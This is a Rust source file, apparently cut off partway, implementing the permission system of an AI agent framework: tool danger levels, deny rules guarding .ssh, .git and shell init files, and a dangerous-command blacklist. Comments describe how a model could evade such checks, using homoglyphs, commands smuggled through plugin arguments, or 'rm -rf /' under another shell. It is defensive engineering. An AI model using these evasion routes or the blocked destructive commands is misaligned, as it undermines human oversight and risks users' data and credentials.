//! Copyright (c) 2025-2026 Wenze Wei. All Rights Reserved.
//!
//! This file is part of Encre.
//! The Encre project belongs to the Dunimd Team.
//!
//! Licensed under the Apache License, Version 2.0 (the "License");
//! You may not use this file except in compliance with the License.
//! You may obtain a copy of the License at
//!
//!     http://www.apache.org/licenses/LICENSE-2.0
//!
//! Unless required by applicable law or agreed to in writing, software
//! distributed under the License is distributed on an "AS IS" BASIS,
//! WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//! See the License for the specific language governing permissions and
//! limitations under the License.
//!
//! DISCLAIMER: Users must comply with applicable AI regulations.
//! Non-compliance may result in service termination or legal liability.

//! Unified permission system for the Encre agent framework.
//!
//! All authorization decisions — tool-level allow/deny/ask, dangerous-command
//! detection, and MCP tool resolution — are implemented here in Rust.  Python
//! tools call `permission_check` and forward the decision to the client; the
//! client may then call `permission_record_decision` to persist the answer
//! for future invocations.
//!
//! The three terminal states are:
//! * `Allow` — run the tool silently.
//! * `Deny`  — refuse, return a short error message to the model.
//! * `Ask`   — request user confirmation through the frontend.

use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use std::sync::{OnceLock, RwLock};

// ---------------------------------------------------------------------------
// Decision types
// ---------------------------------------------------------------------------

/// Outcome of a permission check.  Mirrors the protocol returned to Python.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "behavior", rename_all = "snake_case")]
pub enum PermissionDecision {
    /// Tool may execute without user interaction.
    Allow,
    /// Tool must not execute.
    Deny { reason: String },
    /// Tool may execute only after the user confirms.
    Ask { reason: String, rule: String },
}

impl PermissionDecision {
    pub fn behavior_str(&self) -> &'static str {
        match self {
            PermissionDecision::Allow => "allow",
            PermissionDecision::Deny { .. } => "deny",
            PermissionDecision::Ask { .. } => "ask",
        }
    }
}

// ---------------------------------------------------------------------------
// Policy table
// ---------------------------------------------------------------------------

/// Persisted user-managed policy for a tool or capability.  `Default` defers
/// to dangerous-pattern detection (only meaningful for the `bash` tool).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Hash)]
#[serde(rename_all = "lowercase")]
pub enum PolicyValue {
    Allow,
    Deny,
    Ask,
    Default,
}

impl PolicyValue {
    fn from_str(value: &str) -> Self {
        match value.to_lowercase().as_str() {
            "allow" => PolicyValue::Allow,
            "deny" => PolicyValue::Deny,
            "ask" => PolicyValue::Ask,
            _ => PolicyValue::Default,
        }
    }
}

/// Origin of a policy entry.  Higher precedence sources override lower ones
/// when resolving the effective policy for a tool or capability.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PolicySource {
    /// Fallback value when nothing else is configured.
    Default,
    /// User-level configuration, e.g. `~/.encre/config.toml`.
    User,
    /// Project-level configuration, e.g. `<cwd>/.claude/settings.json`.
    Project,
    /// Command-line overrides supplied at startup.
    Cli,
    /// Dynamically injected by a permission hook.
    Hook,
    /// A transient decision made by the user during the current session.
    Session,
}

impl PolicySource {
    /// Resolution order: session decisions are most specific, defaults least.
    fn precedence() -> &'static [PolicySource] {
        &[
            PolicySource::Session,
            PolicySource::Hook,
            PolicySource::Cli,
            PolicySource::Project,
            PolicySource::User,
            PolicySource::Default,
        ]
    }
}

/// A permission policy learned from an explicit user correction.
///
/// Learned entries form a **tightening-only** layer: only `deny` and `ask` are
/// ever honoured, and the layer is evaluated as a hard floor alongside the
/// dangerous-command blacklist, so a learned entry can never loosen a
/// decision.  An `allow`-style entry is dropped outright by
/// [`permission_set_learned_policies`], which makes "the user wanted to widen
/// access" impossible to express here -- the Python compiler maps such a
/// preference to `ask` before it ever reaches Rust.
///
/// An entry may target a tool or a capability, and may additionally be scoped
/// by a path fragment and/or a shell-command fragment so a correction such as
/// "never read ~/.secrets" or "don't run `npm publish`" denies only the
/// intended target instead of the whole tool.
#[derive(Debug, Default, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LearnedPolicy {
    /// Target tool name (empty when only `capability` is set).
    #[serde(default)]
    pub tool: String,
    /// Target capability name (empty when only `tool` is set).
    #[serde(default)]
    pub capability: String,
    /// Optional path fragment; when set the entry applies only if a path
    /// extracted from the tool arguments contains it.
    #[serde(default)]
    pub path_scope: String,
    /// Optional shell-command fragment; when set the entry applies only to the
    /// `bash` family when the extracted command contains it.
    #[serde(default)]
    pub command_scope: String,
    /// `deny` or `ask`.  Any other value (notably `allow`) is ignored, so the
    /// learned layer can only ever restrict access.
    pub policy: String,
    /// Human-readable justification surfaced to the user / model.
    #[serde(default)]
    pub reason: String,
    /// Rule identifier surfaced alongside `ask` decisions.
    #[serde(default)]
    pub rule: String,
}

/// State holder for the active policy set.  Persists through Python.
///
/// Policies are grouped by source so that a project-level deny can override a
/// user-level allow, and a one-off session decision can override everything.
/// The legacy flat `tools` and `capabilities` maps are retained for backward
/// compatibility with older configuration payloads and are treated as `User`
/// source entries.
#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct PolicyState {
    /// `source -> tool_name -> policy`.
    #[serde(default)]
    pub tools_by_source: HashMap<PolicySource, HashMap<String, PolicyValue>>,
    /// `source -> capability_name -> policy`.
    #[serde(default)]
    pub capabilities_by_source: HashMap<PolicySource, HashMap<String, PolicyValue>>,
    /// Legacy flat tool map; treated as `User` source.
    #[serde(default)]
    pub tools: HashMap<String, PolicyValue>,
    /// Legacy flat capability map; treated as `User` source.
    #[serde(default)]
    pub capabilities: HashMap<String, PolicyValue>,
    /// Tightening-only policies learned from user corrections.  `None` means
    /// "not supplied by this payload": [`permission_set_policies`] then keeps
    /// the existing learned set instead of clearing it, so a settings-panel
    /// update of the tool/capability table cannot silently drop learned rules.
    #[serde(default)]
    pub learned: Option<Vec<LearnedPolicy>>,
}

impl PolicyState {
    /// Resolve the effective policy for a key across all sources.
    ///
    /// When `session_only` is set the user-managed configuration sources are
    /// ignored and only a transient decision made during the current session
    /// (`PolicySource::Session`) is honoured.  This backs the "custom mode
    /// only" rule: per-tool settings apply exclusively in the `custom`
    /// permission mode, while a one-off "allow for this session" answer keeps
    /// working in the preset modes.
    fn resolve_tool(&self, key: &str, session_only: bool) -> Option<PolicyValue> {
        resolve_policy(&self.tools_by_source, &self.tools, key, session_only)
    }

    /// Resolve the effective policy for a capability across all sources.
    fn resolve_capability(&self, key: &str, session_only: bool) -> Option<PolicyValue> {
        resolve_policy(&self.capabilities_by_source, &self.capabilities, key, session_only)
    }
}

/// Resolve a policy by walking the source precedence list.  Legacy flat maps
/// are consulted after all explicit source groups.
fn resolve_policy(
    by_source: &HashMap<PolicySource, HashMap<String, PolicyValue>>,
    legacy: &HashMap<String, PolicyValue>,
    key: &str,
    session_only: bool,
) -> Option<PolicyValue> {
    if session_only {
        let entry = by_source.get(&PolicySource::Session)?.get(key)?;
        return if matches!(entry, PolicyValue::Default) {
            None
        } else {
            Some(entry.clone())
        };
    }
    for source in PolicySource::precedence() {
        if let Some(map) = by_source.get(source) {
            if let Some(policy) = map.get(key) {
                if !matches!(policy, PolicyValue::Default) {
                    return Some(policy.clone());
                }
            }
        }
    }
    legacy.get(key).cloned()
}

// ---------------------------------------------------------------------------
// Tool capability table
// ---------------------------------------------------------------------------

/// Returns the set of capabilities a tool touches.  Empty for tools that need
/// no capability gate.  MCP tools keep the `mcp` capability so they can be
/// gated as a class.
pub fn tool_capabilities(name: &str) -> &'static [&'static str] {
    match name {
        "bash" | "bash_output" | "bash_kill" | "bash_list" => &["bash_io"],
        "file_read" | "file_write" | "file_edit" | "apply_patch" | "grep"
        | "glob" | "find_tool" => &["file"],
        "rest_client" => &["network"],
        "browser" => &["browser"],
        "docker" => &["docker"],
        "workflow" => &["workflow"],
        "git" => &["git"],
        "deploy" => &["deploy"],
        "desktop" | "computer_use" | "vlm_computer_use" => &["desktop"],
        "database" => &["database"],
        "notebook" | "pdf" | "spreadsheet" | "image" | "lsp" | "lint_format"
        | "test_runner" => &["misc"],
        "web_fetch" | "web_search" | "agent" | "cron_create" | "cron_delete"
        | "cron_list" | "task_create" | "task_get" | "task_list" | "task_update"
        | "task_stop" | "task_output" | "memory_create" | "memory_read"
        | "memory_update" | "memory_delete" | "memory_search" | "memory_profile"
        | "todo" | "question" => &[],
        _ => {
            if name.starts_with("mcp__") {
                &["mcp"]
            } else {
                &[]
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Static tool danger classification
// ---------------------------------------------------------------------------

/// Static danger classification for a tool, used when NO explicit policy
/// entry exists for it (neither tool-level nor capability-level).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ToolDanger {
    /// No inherent danger: silently allowed when unconfigured.
    Safe,
    /// High danger: side effects on files, network or external systems.
    High,
    /// Critical danger: arbitrary command execution, system or
    /// infrastructure control.
    Critical,
}

/// Classify a tool by its inherent danger level.
///
/// This is a static property of the tool itself -- independent of any user
/// configuration.  It only matters when the policy table has no entry for the
/// tool (and none for its capabilities): unconfigured high/critical tools
/// must never silently execute the way unconfigured safe tools do.
pub fn tool_danger_level(name: &str) -> ToolDanger {
    match name {
        // Arbitrary command execution and system / infra control.
        "bash" | "bash_kill" | "docker" | "database" | "deploy" | "desktop"
        | "computer_use" | "vlm_computer_use" => ToolDanger::Critical,
        // Irreversible file writes, VCS mutations, network and external
        // system access, external MCP servers.
        "file_write" | "file_edit" | "apply_patch" | "git" | "rest_client"
        | "browser" | "workflow" => ToolDanger::High,
        // Known read-only tools: unconfigured, they execute silently.
        "file_read" | "grep" | "glob" | "read" | "pdf" | "spreadsheet"
        | "document" | "media" | "media_api" | "list_models" | "test_runner"
        | "bash_list" => ToolDanger::Safe,
        _ => {
            if name.starts_with("mcp__") {
                // External MCP tools execute third-party code paths.
                ToolDanger::High
            } else {
                // Unknown tools (plugins, EA packages, dynamically registered
                // names) are treated as high danger: an unrecognized name must
                // never silently pass the unconfigured default.  A user can
                // explicitly allow-list a plugin tool to restore silent flow.
                ToolDanger::High
            }
        }
    }
}

/// File-mutation family that the `accept_edits` preset mode auto-approves.
fn is_edit_family(name: &str) -> bool {
    matches!(name, "file_write" | "file_edit" | "apply_patch" | "notebook")
}

/// Resolve the effective danger level for a tool: an entry in the dynamic
/// plugin table (registered at activation time) shadows the static
/// classification; unknown tools keep the static default.
fn resolve_tool_danger(name: &str, dynamic: &HashMap<String, ToolDanger>) -> ToolDanger {
    if let Some(level) = dynamic.get(name) {
        return *level;
    }
    tool_danger_level(name)
}

// ---------------------------------------------------------------------------
// Immune paths — always-deny floor for destructive ops, even in bypass mode
// ---------------------------------------------------------------------------

/// Path fragments (normalised forward-slash, lowercased) that must never be
/// touched by a destructive tool call, regardless of permission mode.  These
/// cover VCS internals (``.git/``), agent config (``.claude/``), shell init
/// files (hijackable on the next shell spawn) and SSH credentials
/// (exfiltration / forgery risk).  Read access is not restricted here; this
/// floor only guards writes/deletes.
const IMMUNE_PATH_FRAGMENTS: &[&str] = &[
    "/.git/",
    "/.claude/",
    "/.ssh/",
    "/.bashrc",
    "/.zshrc",
    "/.bash_profile",
    "/.zprofile",
    "/.gitconfig",
];

/// Bare filenames matched at the path tail, for home-relative files such as
/// exactly ``~/.bashrc``.
const IMMUNE_PATH_BASENAMES: &[&str] = &[
    ".bashrc",
    ".zshrc",
    ".bash_profile",
    ".zprofile",
    ".gitconfig",
];

/// Substrings that flag a raw shell token as a candidate immune target during
/// the defensive catch-all scan.
const IMMUNE_TOKEN_HINTS: &[&str] =
    &[".git/", ".ssh/", ".claude/", ".bashrc", ".zshrc", ".gitconfig"];

/// Tool names whose primary effect is mutating the filesystem (or running a
/// shell that can).  The immune floor applies to this family only; mirrors
/// the legacy Python `_WRITE_TOOL_NAMES` set.
const WRITE_TOOLS: &[&str] = &[
    "file_write", "write_file", "file_edit", "edit_file", "file_delete",
    "delete_file", "apply_patch", "patch", "bash", "shell", "execute",
    "git_tool", "git", "mv", "cp", "rm", "sed", "tee",
];

/// Best-effort home directory for ``~`` expansion in immune-path matching.
fn home_dir() -> Option<String> {
    if let Ok(home) = std::env::var("USERPROFILE") {
        if !home.is_empty() {
            return Some(home);
        }
    }
    if let Ok(home) = std::env::var("HOME") {
        if !home.is_empty() {
            return Some(home);
        }
    }
    None
}

/// Expand ``~`` / strip quotes / forward-slash-normalise / lowercase a path
/// fragment so immune matching is platform-independent.
fn normalize_path_for_immune(raw: &str) -> String {
    let unquoted = raw.trim().trim_matches(|c| c == '\'' || c == '"');
    let expanded = if unquoted == "~" {
        home_dir().unwrap_or_else(|| unquoted.to_string())
    } else if let Some(rest) = unquoted.strip_prefix("~/") {
        match home_dir() {
            Some(home) => format!("{home}/{rest}"),
            None => unquoted.to_string(),
        }
    } else {
        unquoted.to_string()
    };
    expanded.replace('\\', "/").to_lowercase()
}

/// Return the matched immune fragment, or ``None`` when the path is clean.
pub fn matches_immune_path(raw_path: &str) -> Option<String> {
    if raw_path.trim().is_empty() {
        return None;
    }
    let norm = normalize_path_for_immune(raw_path);
    if norm.is_empty() {
        return None;
    }
    // Ensure a leading slash so fragment matching is unambiguous when the
    // caller passes a bare relative path like ".git/config".
    let probe = if norm.starts_with('/') {
        norm.clone()
    } else {
        format!("/{norm}")
    };
    for frag in IMMUNE_PATH_FRAGMENTS {
        if probe.contains(frag) {
            return Some(frag.trim_matches('/').to_string());
        }
    }
    // Basename match at the tail (e.g. "~/x/.bashrc" or "~/.bashrc").
    if let Some(tail) = norm.rsplit('/').next() {
        if IMMUNE_PATH_BASENAMES.contains(&tail) {
            return Some(tail.to_string());
        }
    }
    None
}

/// Compiled extraction patterns for immune-candidate paths.
struct ImmuneRegexes {
    /// Unified-diff additions (``+++ b/<path>``).
    patch_add: Regex,
    /// Unified-diff deletions (``--- a/<path>``).
    patch_del: Regex,
    /// Shell write/append redirect targets (``>foo``, ``>>foo``, ``tee foo``).
    redirect: Regex,
    /// ``mv`` / ``cp`` destination (second path argument).
    mv_cp: Regex,
    /// ``rm`` / ``rmdir`` target.
    rm: Regex,
    /// ``sed -i`` in-place edit target.
    sed_inplace: Regex,
}

fn immune_regexes() -> &'static ImmuneRegexes {
    static RE: OnceLock<ImmuneRegexes> = OnceLock::new();
    RE.get_or_init(|| ImmuneRegexes {
        patch_add: Regex::new(r"(?m)^\+\+\+\s+b/(.+)$").expect("valid regex"),
        patch_del: Regex::new(r"(?m)^---\s+a/(.+)$").expect("valid regex"),
        redirect: Regex::new(r"(?:>>?|tee(?:\s+-a)?)\s*([^\s|;&<>]+)").expect("valid regex"),
        mv_cp: Regex::new(r"\b(?:mv|cp)\s+(?:-[rRfv]+\s+)?(\S+)\s+(\S+)").expect("valid regex"),
        rm: Regex::new(r"\b(?:rm|rmdir)\s+(?:-[rRfv]+\s+)?(\S+)").expect("valid regex"),
        sed_inplace: Regex::new(r"\bsed\s+.*?-i\b\s*\S*\s+(\S+)").expect("valid regex"),
    })
}

/// Pull path-like strings out of a tool call for immune-path matching.
///
/// Covers direct path fields used by the file family, ``+++ b/...`` markers
/// from unified diffs (``apply_patch``), and bash redirect / mv / cp / rm /
/// tee / sed -i targets, plus a defensive raw-token catch-all.  Not
/// exhaustive — false negatives simply fall through to the normal permission
/// path, never a false allow.
fn extract_immune_candidate_paths(args: &str) -> Vec<String> {
    let Ok(parsed) = serde_json::from_str::<Value>(args) else {
        return Vec::new();
    };
    let Some(obj) = parsed.as_object() else {
        return Vec::new();
    };
    let mut out: Vec<String> = Vec::new();
    for key in [
        "path", "file_path", "filename", "filepath", "target", "dest", "destination",
    ] {
        if let Some(s) = obj.get(key).and_then(|v| v.as_str()) {
            if !s.trim().is_empty() {
                out.push(s.to_string());
            }
        }
    }
    let patch = obj
        .get("patch")
        .and_then(|v| v.as_str())
        .or_else(|| obj.get("diff").and_then(|v| v.as_str()));
    if let Some(patch) = patch {
        let res = immune_regexes();
        for caps in res.patch_add.captures_iter(patch) {
            if let Some(m) = caps.get(1) {
                out.push(m.as_str().trim().to_string());
            }
        }
        for caps in res.patch_del.captures_iter(patch) {
            if let Some(m) = caps.get(1) {
                out.push(m.as_str().trim().to_string());
            }
        }
    }
    let cmd = obj
        .get("command")
        .and_then(|v| v.as_str())
        .or_else(|| obj.get("cmd").and_then(|v| v.as_str()));
    if let Some(cmd) = cmd {
        if !cmd.trim().is_empty() {
            let res = immune_regexes();
            for caps in res.redirect.captures_iter(cmd) {
                if let Some(m) = caps.get(1) {
                    out.push(m.as_str().to_string());
                }
            }
            for caps in res.mv_cp.captures_iter(cmd) {
                if let Some(m) = caps.get(2) {
                    out.push(m.as_str().to_string());
                }
            }
            for caps in res.rm.captures_iter(cmd) {
                if let Some(m) = caps.get(1) {
                    out.push(m.as_str().to_string());
                }
            }
            for caps in res.sed_inplace.captures_iter(cmd) {
                if let Some(m) = caps.get(1) {
                    out.push(m.as_str().to_string());
                }
            }
            for tok in cmd.split_whitespace() {
                if IMMUNE_TOKEN_HINTS.iter().any(|hint| tok.contains(hint)) {
                    out.push(tok.to_string());
                }
            }
        }
    }
    out
}

/// Immune check over a full tool call: extract candidate target paths from
/// the JSON arguments, then match each against the immune set.  Returns the
/// matched fragment of the first hit.
fn check_immune_args(args: &str) -> Option<String> {
    for cand in extract_immune_candidate_paths(args) {
        if let Some(hit) = matches_immune_path(&cand) {
            return Some(hit);
        }
    }
    None
}

/// Public immune check for one tool call (Python: path guards / streaming
/// executor).  Only the write-tool family is inspected; every other tool is
/// clean by definition.
pub fn permission_check_immune(tool_name: &str, args: &str) -> Option<String> {
    if !WRITE_TOOLS.contains(&tool_name) {
        return None;
    }
    check_immune_args(args)
}

/// Public immune check for a single path string.
pub fn permission_check_immune_path(path: &str) -> Option<String> {
    matches_immune_path(path)
}

/// True when *tool_name* belongs to the filesystem-mutating family the
/// immune floor guards.
pub fn is_write_tool(tool_name: &str) -> bool {
    WRITE_TOOLS.contains(&tool_name)
}

// ---------------------------------------------------------------------------
// Shell command splitting
// ---------------------------------------------------------------------------

/// Split a shell command line by control operators (`;`, `&&`, `||`, bare `|`)
/// into individual subcommands.  This is intentionally lightweight: it honours
/// single/double quoting and backslash escaping but does not expand variables
/// or process subshells.  The result is accurate enough for dangerous-pattern
/// matching on each subcommand.
pub fn split_shell_command(command: &str) -> Vec<String> {
    let mut parts = Vec::new();
    let mut current = String::new();
    let chars: Vec<char> = command.chars().collect();
    let mut i = 0;
    let mut in_single = false;
    let mut in_double = false;

    while i < chars.len() {
        let c = chars[i];
        match c {
            // Escaped character outside quotes: keep the pair together.
            '\\' if !in_single && !in_double => {
                current.push(c);
                i += 1;
                if i < chars.len() {
                    current.push(chars[i]);
                }
            }
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            ';' if !in_single && !in_double => {
                flush_subcommand(&mut parts, &mut current);
            }
            '&' if !in_single && !in_double && i + 1 < chars.len() && chars[i + 1] == '&' => {
                flush_subcommand(&mut parts, &mut current);
                i += 1; // skip the second '&'
            }
            '|' if !in_single && !in_double && i + 1 < chars.len() && chars[i + 1] == '|' => {
                flush_subcommand(&mut parts, &mut current);
                i += 1; // skip the second '|'
            }
            '|' if !in_single && !in_double => {
                // A bare pipe separates commands for our purposes; the receiving
                // command (e.g. `sh`) is what we actually want to gate.
                flush_subcommand(&mut parts, &mut current);
            }
            '\n' if !in_single && !in_double => {
                flush_subcommand(&mut parts, &mut current);
            }
            _ => current.push(c),
        }
        i += 1;
    }
    flush_subcommand(&mut parts, &mut current);

    parts
        .into_iter()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

fn flush_subcommand(parts: &mut Vec<String>, current: &mut String) {
    let trimmed = current.trim();
    if !trimmed.is_empty() {
        parts.push(trimmed.to_string());
    }
    current.clear();
}

/// Extract the raw shell command from the JSON-serialized bash tool input.
/// Returns `None` when the payload is not valid JSON or has no `command` key.
fn extract_bash_command(args: &str) -> Option<String> {
    let parsed: Value = serde_json::from_str(args).ok()?;
    parsed.get("command")?.as_str().map(|s| s.to_string())
}

/// Extract the model-chosen shell from the bash tool input, if it named one.
///
/// Feeds :func:`shell_family_tags` so the blacklist follows the interpreter the
/// command will actually run under rather than only the host it was built for.
fn extract_bash_terminal(args: &str) -> Option<String> {
    let parsed: Value = serde_json::from_str(args).ok()?;
    parsed
        .get("terminal")?
        .as_str()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Extract a shell-like command string from ANY tool's JSON arguments.
///
/// Jailbreak vector: a plugin or renamed tool can smuggle a shell command in a
/// `command` / `cmd` argument even though the tool is not part of the `bash`
/// family.  Returning `Some` here routes that payload through the same
/// dangerous-pattern blacklist as the bash tool itself.
fn extract_generic_command(args: &str) -> Option<String> {
    let parsed: Value = serde_json::from_str(args).ok()?;
    for key in ["command", "cmd"] {
        if let Some(s) = parsed.get(key).and_then(|v| v.as_str()) {
            if !s.trim().is_empty() {
                return Some(s.to_string());
            }
        }
    }
    None
}

/// Normalise command text before dangerous-pattern matching.
///
/// Strips zero-width characters and folds common homoglyphs (Cyrillic / Greek
/// letters that look like ASCII) so that a model cannot slip `rm -rf` or
/// `sudo` past the regex table by swapping look-alike codepoints.
fn normalize_command_text(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    for ch in raw.chars() {
        match ch {
            '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{2060}' | '\u{FEFF}' => continue,
            // Cyrillic look-alikes
            '\u{0430}' => out.push('a'), // а
            '\u{0435}' => out.push('e'), // е
            '\u{043E}' => out.push('o'), // о
            '\u{0440}' => out.push('p'), // р
            '\u{0441}' => out.push('c'), // с
            '\u{0443}' => out.push('y'), // у
            '\u{0445}' => out.push('x'), // х
            '\u{0456}' => out.push('i'), // і
            '\u{0455}' => out.push('s'), // ѕ
            '\u{04BB}' => out.push('h'), // һ
            '\u{04C0}' => out.push('I'), // Ӏ
            // Greek look-alikes
            '\u{03BF}' => out.push('o'), // ο
            '\u{03B1}' => out.push('a'), // α
            '\u{03B5}' => out.push('e'), // ε
            '\u{03C1}' => out.push('p'), // ρ
            '\u{03C5}' => out.push('u'), // υ
            '\u{03BA}' => out.push('k'), // κ
            _ => out.push(ch),
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Dangerous-command patterns loaded from dangerous_commands.txt
// ---------------------------------------------------------------------------

/// One blacklist entry: the shell family it applies to, the compiled pattern,
/// and the metadata that lets a caller *classify* a hit instead of merely
/// blocking it.
///
/// `severity` and `category` come from `#! severity=… category=…` directive
/// lines in `dangerous_commands.txt` and default to `high` / empty, so a file
/// written before metadata existed keeps matching exactly as it always did.
#[derive(Clone, Debug)]
struct DangerousRule {
    tag: String,
    severity: String,
    category: String,
    re: Regex,
}

/// Severity a blacklist line carries when no directive says otherwise. Matches
/// the historical effect of a hit (deny under bypass, ask under default).
const DANGER_DEFAULT_SEVERITY: &str = "high";

/// Compiled blacklist table.
#[derive(Default)]
struct DangerousTable {
    patterns: Vec<DangerousRule>,
}

impl DangerousTable {
    fn load_from_file(path: &Path) -> Self {
        match fs::read_to_string(path) {
            Ok(text) => Self::load_from_text(&text),
            Err(_) => DangerousTable { patterns: Vec::new() },
        }
    }

    /// Parse the blacklist.
    ///
    /// Recognised line kinds: `[linux]` / `[windows]` / `[macos]` /
    /// `[universal]` section headers (which also reset the metadata defaults),
    /// `#! severity=… category=…` directives (applied to every pattern that
    /// follows, so grouping stays cheap), plain `#` comments, and anything else
    /// being a regex.
    fn load_from_text(text: &str) -> Self {
        let mut patterns: Vec<DangerousRule> = Vec::new();
        let mut current: Option<String> = None;
        let mut severity = DANGER_DEFAULT_SEVERITY.to_string();
        let mut category = String::new();
        for raw_line in text.lines() {
            let line = raw_line.trim();
            if line.is_empty() {
                continue;
            }
            // Bare section header lines such as ``[linux]``, ``[windows]``,
            // ``[macos]`` (with or without a leading '#') switch the
            // current platform tag.
            if line.starts_with('[') && line.ends_with(']') {
                let tag = line[1..line.len() - 1].trim().to_lowercase();
                if !tag.is_empty() {
                    current = Some(tag);
                    severity = DANGER_DEFAULT_SEVERITY.to_string();
                    category = String::new();
                }
                continue;
            }
            // Pure comment lines that look like ``# -- LINUX --...`` are
            // ignored, but inline tags like ``# [linux]`` also switch the
            // section so older formatted files keep working.
            if let Some(rest) = line.strip_prefix('#') {
                let rest = rest.trim();
                if let Some(directive) = rest.strip_prefix('!') {
                    for token in directive.split_whitespace() {
                        if let Some((key, value)) = token.split_once('=') {
                            match key.trim() {
                                "severity" => severity = value.trim().to_lowercase(),
                                "category" => category = value.trim().to_lowercase(),
                                _ => {}
                            }
                        }
                    }
                    continue;
                }
                if let Some(inner) = rest.strip_prefix('[') {
                    if let Some(tag) = inner.strip_suffix(']') {
                        current = Some(tag.trim().to_lowercase());
                        severity = DANGER_DEFAULT_SEVERITY.to_string();
                        category = String::new();
                    }
                }
                continue;
            }
            let Some(tag) = current.clone() else {
                continue;
            };
            match Regex::new(line) {
                Ok(re) => patterns.push(DangerousRule {
                    tag,
                    severity: severity.clone(),
                    category: category.clone(),
                    re,
                }),
                Err(err) => eprintln!(
                    "[encre::permission] bad regex in dangerous_commands.txt \
                     under [{tag}]: {err}"
                ),
            }
        }
        DangerousTable { patterns }
    }

    /// First rule whose section tag is in `tags` (or `[universal]`) and whose
    /// pattern matches `command`.
    ///
    /// The default-shell note lives on :func:`shell_family_tags`; a hit is
    /// reported here so callers can read its severity and category, not just
    /// the pattern text.
    fn find(&self, command: &str, tags: &[&str]) -> Option<&DangerousRule> {
        self.patterns.iter().find(|rule| {
            if rule.tag != "universal"
                && !tags.iter().any(|t| {
                    *t == rule.tag.as_str()
                        // macOS is Unix-based: check both `macos` and `linux` tagged patterns.
                        || (*t == "macos" && rule.tag == "linux")
                })
            {
                return false;
            }
            rule.re.is_match(command)
        })
    }

    /// Every matching rule, for callers that classify rather than merely block.
    fn findall<'a>(&'a self, command: &str, tags: &[&str]) -> Vec<&'a DangerousRule> {
        self.patterns
            .iter()
            .filter(|rule| {
                if rule.tag != "universal"
                    && !tags.iter().any(|t| {
                        *t == rule.tag.as_str()
                            || (*t == "macos" && rule.tag == "linux")
                    })
                {
                    return false;
                }
                rule.re.is_match(command)
            })
            .collect()
    }
}

/// Section tags the bash tool's model-supplied `terminal` argument pulls in,
/// on top of the host's own.
///
/// The default shell is a recommendation, not a constraint -- the model may
/// pass `terminal="bash"` on a Windows build and run `rm -rf /` for real, so
/// filtering the blacklist by compile target alone under-matches. This is
/// deliberately widening-only: the host tag always stays in play, so a macOS
/// build asking for `zsh` keeps its `[macos]` extras as well as `[linux]`.
fn shell_family_tags(terminal: &str) -> &'static [&'static str] {
    match terminal.to_ascii_lowercase().trim() {
        "bash" | "zsh" | "sh" | "shell" => &["linux"],
        "powershell" | "pwsh" | "cmd" => &["windows"],
        _ => &[],
    }
}

/// Section tags that apply to one bash call: the build host's own, widened by
/// the family of whatever shell the model named in `terminal`.
///
/// Kept separate from :func:`match_dangerous` so the assertions hold on every
/// build host instead of only where the hole actually bites.
fn danger_tags(args: &str) -> Vec<&'static str> {
    let mut tags: Vec<&'static str> = vec![current_platform_tag()];
    if let Some(terminal) = extract_bash_terminal(args) {
        for extra in shell_family_tags(&terminal) {
            if !tags.contains(extra) {
                tags.push(extra);
            }
        }
    }
    tags
}

fn current_platform_tag() -> &'static str {
    if cfg!(target_os = "macos") {
        "macos"
    } else if cfg!(target_os = "windows") {
        "windows"
    } else {
        "linux"
    }
}

// ---------------------------------------------------------------------------
// Manager — thread-safe global state
// ---------------------------------------------------------------------------

struct ManagerInner {
    state: PolicyState,
    dangerous: DangerousTable,
    /// Dynamic danger-level overrides for plugin tools (`tool_name` ->
    /// classification), merged in at plugin activation time.  Entries here
    /// shadow the static classification in [`tool_danger_level`].
    tool_danger: HashMap<String, ToolDanger>,
    /// Declarative plugin permission rules (`plugin_name` -> (`tool` ->
    /// allow)).  Pushed at plugin activation, removed on deactivate /
    /// uninstall.  `tool` is an exact tool name or `"*"` (wildcard).  The
    /// vote for a tool is computed here -- deny beats allow -- so plugin
    /// authorization never depends on Python-side state.
    plugin_policies: HashMap<String, HashMap<String, bool>>,
    /// Per-plugin resource grants compiled from the manifest
    /// (`[tool.ea.resources]`).  Fail-closed: a missing kind means the
    /// plugin has no grant of that kind.  The plugin's own package
    /// directory is merged in by the registry at push time.
    plugin_resources: HashMap<String, PluginResources>,
    /// Tool ownership (`tool_name` -> plugin + active flag).  Registered at
    /// plugin tool registration; flipped inactive the moment the plugin is
    /// deactivated so a deactivate/uninstall race can never leave the
    /// tool callable through the registry window.
    tool_owner: HashMap<String, ToolOwnership>,
    /// Frontend surface grants per plugin (`tool -> plugin`'s UI sync
    /// permission).  Trusted plugins (bundled / mandatory) default to
    /// allow-everything; untrusted (third-party) default to deny-everything
    /// and must declare ``[tool.ea.ui_permissions]`` explicitly.  The WS
    /// layer consults this table before putting any plugin UI data on the
    /// wire, so ungranted surfaces never reach the renderer.
    plugin_ui: HashMap<String, PluginUiPermissions>,
    /// Active session permission mode.  Only `"custom"` makes the user-managed
    /// per-tool / per-capability policy table effective; every other mode
    /// (manual approval, auto approval, full access) runs without it.
    mode: String,
}

/// Frontend surface grants for one plugin.
#[derive(Clone)]
struct PluginUiPermissions {
    /// Allow every UI surface (expanded at set time when true).
    all: bool,
    /// Mountable UI providers (iframe / assets injection).
    providers: bool,
    /// Tool rendering metadata.
    tool_meta: bool,
    /// Contribution kind whitelist; empty = none, contains `"*"` = all.
    contributions: Vec<String>,
}

/// One plugin-owned tool's identity and activation state.
#[derive(Clone)]
struct ToolOwnership {
    plugin: String,
    active: bool,
}

static MANAGER: OnceLock<RwLock<ManagerInner>> = OnceLock::new();

